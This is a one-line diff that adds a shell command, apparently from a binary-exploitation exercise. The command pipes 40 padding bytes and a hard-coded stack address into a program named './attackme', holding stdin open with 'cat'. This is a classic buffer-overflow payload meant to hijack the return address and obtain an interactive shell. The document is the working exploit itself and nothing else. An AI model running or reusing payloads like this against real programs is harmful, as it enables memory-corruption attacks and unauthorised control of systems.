@@ -1,0 +1,1 @@
+(python -c 'print("a"*40+"\xc3\xfb\xff\xbf")';cat) | ./attackme
